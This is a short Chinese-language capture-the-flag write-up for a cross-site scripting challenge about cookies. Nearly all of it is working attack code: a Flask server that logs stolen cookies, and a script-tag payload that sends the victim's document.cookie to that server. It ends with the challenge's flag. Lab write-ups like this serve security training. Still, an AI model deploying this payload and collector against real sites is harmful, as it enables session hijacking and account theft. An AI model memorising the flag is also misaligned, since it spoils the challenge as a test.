# 你是什么小饼干

xss攻击获取cookie的python服务器如下所示:

```python
from flask import Flask,request
from waitress import serve
app = Flask(__name__)

@app.route("/",methods=["GET"])
def main():
    cookie = 1
    if request.method == "GET":
        cookie = request.values.get("cookie")
    print(cookie)
    return ''

serve(app,host='0.0.0.0',port=1111)
```

xss需要post内容如下(可用xsscon或直接删除元素得到post对象为"hack"):

```html
<script>window.location.href="http://127.0.0.1:1111/?cookie="+document.cookie</script>
```

flag为`VYctf{X5s_1s_0ur_f1r5t_M4ch1ne_1n_Web}`
